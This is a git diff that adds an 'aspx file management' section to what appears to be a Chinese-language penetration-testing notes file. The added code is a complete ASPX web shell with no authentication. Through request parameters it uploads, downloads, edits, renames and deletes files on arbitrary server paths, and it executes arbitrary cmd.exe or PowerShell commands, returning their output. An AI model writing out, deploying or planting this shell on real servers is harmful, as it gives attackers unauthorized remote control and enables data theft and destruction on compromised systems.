@@ -5968,3 +5968,161 @@ https://xz.aliyun.com/t/6737
 
 https://forum.butian.net/share/443
 ```
+
+
+aspx文件管理
+```
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Diagnostics" %>
+
+<%
+string p = Request["p"] ?? @"e:\Applications\";
+
+try{
+    // 上传文件
+    if(Request.Files.Count>0){
+        for(int i=0;i<Request.Files.Count;i++){
+            var f=Request.Files[i];
+            f.SaveAs(Path.Combine(p,Path.GetFileName(f.FileName)));
+        }
+    }
+
+    // 删除文件
+    if(Request["del"]!=null){
+        var fp=Path.Combine(p,Request["del"]);
+        if(File.Exists(fp)){
+            try{ File.Delete(fp); Response.Write("<p style='color:green'>Deleted: "+Request["del"]+"</p>"); }
+            catch{ Response.Write("<p style='color:red'>Cannot delete: "+Request["del"]+"</p>"); }
+        } else Response.Write("<p style='color:orange'>File not found: "+Request["del"]+"</p>");
+    }
+
+    // 创建目录
+    if(Request["mkdir"]!=null) Directory.CreateDirectory(Path.Combine(p,Request["mkdir"]));
+
+    // 重命名
+    if(Request["rename"]!=null && Request["newname"]!=null){
+        var oldfp=Path.Combine(p,Request["rename"]);
+        var newfp=Path.Combine(p,Request["newname"]);
+        if(File.Exists(oldfp)) File.Move(oldfp,newfp);
+    }
+
+    // 保存编辑
+    if(Request["save"]!=null) File.WriteAllText(Path.Combine(p,Request["save"]),Request["txt"]);
+
+    // 执行命令 CMD / PowerShell
+    if(Request["cmd"]!=null && Request["type"]!=null){
+        var pr=new Process();
+        if(Request["type"]=="ps"){
+            pr.StartInfo.FileName="powershell.exe";
+            pr.StartInfo.Arguments="-NoProfile -Command \""+Request["cmd"]+"\"";
+        }else{
+            pr.StartInfo.FileName="cmd.exe";
+            pr.StartInfo.Arguments="/c "+Request["cmd"];
+        }
+        pr.StartInfo.RedirectStandardOutput=true;
+        pr.StartInfo.UseShellExecute=false;
+        pr.Start();
+        Response.Write("<pre style='background:#f0f0f0;padding:10px'>"+System.Web.HttpUtility.HtmlEncode(pr.StandardOutput.ReadToEnd())+"</pre>");
+    }
+
+    // 下载文件
+    if(Request["get"]!=null){
+        var fp=Path.Combine(p,Request["get"]);
+        if(File.Exists(fp)){
+            Response.ContentType="application/octet-stream";
+            Response.AddHeader("Content-Disposition","attachment;filename="+Request["get"]);
+            Response.WriteFile(fp);
+            Response.End();
+        }
+    }
+
+}catch(Exception ex){ Response.Write("<p style='color:red'>Error: "+System.Web.HttpUtility.HtmlEncode(ex.Message)+"</p>"); }
+%>
+
+<style>
+body{font-family:Arial;background:#fafafa;color:#333;}
+table{border-collapse:collapse;width:90%;}
+th,td{border:1px solid #ccc;padding:6px;text-align:left;}
+th{background:#eee;}
+a.button{background:#4CAF50;color:white;padding:3px 8px;text-decoration:none;border-radius:3px;}
+a.button:hover{background:#45a049;}
+form.inline{display:inline;}
+</style>
+
+<h2>Dir: <%=p%></h2>
+
+<form method="get"><input name="p" value="<%=p%>" size="60"><input type="submit" value="Go"></form>
+
+<form method="post" enctype="multipart/form-data">
+<input type="file" name="f" multiple><input type="submit" value="Upload">
+</form>
+
+<form style="margin-top:5px;">
+<input name="mkdir" placeholder="New Folder"><input type="hidden" name="p" value="<%=p%>"><input type="submit" value="Create">
+</form>
+
+<form style="margin-top:5px;">
+<select name="type">
+<option value="cmd">CMD</option>
+<option value="ps">PowerShell</option>
+</select>
+<input name="cmd" placeholder="Command"><input type="submit" value="Exec">
+</form>
+
+<table>
+<tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Actions</th></tr>
+
+<%
+var di=new DirectoryInfo(p);
+if(di.Parent!=null){
+%><tr><td colspan="4"><a class="button" href="?p=<%=di.Parent.FullName%>">[.. Parent Directory]</a></td></tr><%
+}
+
+foreach(var d in Directory.GetDirectories(p)){
+    var n=Path.GetFileName(d);
+%>
+<tr><td>[DIR] <%=n%></td><td>-</td><td><%=Directory.GetLastWriteTime(d)%></td>
+<td><a class="button" href="?p=<%=d%>">Open</a></td></tr>
+<%
+}
+
+foreach(var f in Directory.GetFiles(p)){
+    var n=Path.GetFileName(f);
+    var fi=new FileInfo(f);
+%>
+<tr>
+<td><%=n%></td><td><%=fi.Length%> B</td><td><%=fi.LastWriteTime%></td>
+<td>
+<a class="button" href="?get=<%=n%>&p=<%=p%>">Download</a>
+<a class="button" href="?del=<%=n%>&p=<%=p%>">Delete</a>
+<form class="inline">
+<input name="rename" value="<%=n%>" type="hidden">
+<input name="newname" placeholder="Rename">
+<input type="hidden" name="p" value="<%=p%>">
+<input type="submit" value="Rename">
+</form>
+<a class="button" href="?edit=<%=n%>&p=<%=p%>">Edit</a>
+</td>
+</tr>
+<%
+}
+%>
+</table>
+
+<%
+if(Request["edit"]!=null){
+    string fn=Request["edit"];
+    string fp=Path.Combine(p,fn);
+    string t=File.ReadAllText(fp);
+%>
+<form method="post" style="margin-top:10px;">
+<textarea name="txt" rows="15" cols="100" style="width:100%;"><%=System.Web.HttpUtility.HtmlEncode(t)%></textarea>
+<input type="hidden" name="save" value="<%=fn%>">
+<input type="hidden" name="p" value="<%=p%>">
+<br><input type="submit" value="Save">
+</form>
+<%
+}
+%><p style='color:red'>Error: Thread was being aborted.</p>
+```
